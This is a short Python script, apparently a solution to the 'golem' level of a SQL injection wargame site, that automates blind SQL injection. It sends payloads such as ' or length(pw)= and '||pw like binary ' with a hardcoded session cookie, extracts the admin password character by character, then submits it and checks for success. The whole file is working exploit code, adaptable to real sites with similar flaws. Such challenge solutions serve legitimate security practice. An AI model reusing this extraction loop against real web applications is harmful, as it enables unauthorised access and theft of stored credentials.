import requests

headers={'Cookie': 'PHPSESSID=slp9673su5prtdh7eon4mc8go6'}

url="https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
choice="789456123qwertyuiopasdfghjklzxcvbnm"
length=8
'''
for i in range(100):
    param="?pw=' or length(pw)="+str(i)+"-- -"
    base= url+param
    page=requests.get(base,headers=headers)
    if "Hello admin" in page.text:
        length=i
        print(length)
        break
'''
passwd=''
for i in range(1,length+1):
    for j in choice:
        param="?pw='||pw like binary '"+passwd+j+"%'-- -"
        base=url+param
        page=requests.get(base,headers=headers) 
        print("trying :: "+str(i)+"--"+ (j))
        if "Hello admin" in page.text:
            print(base)
            passwd=passwd+(j)
            print(passwd)
            break

print(passwd)
print("done")

param="?pw="+passwd
base=url+param
page=requests.get(base,headers=headers)
if "Clear" in page.text:
    print("Success:)")
else:
    print("NVM")
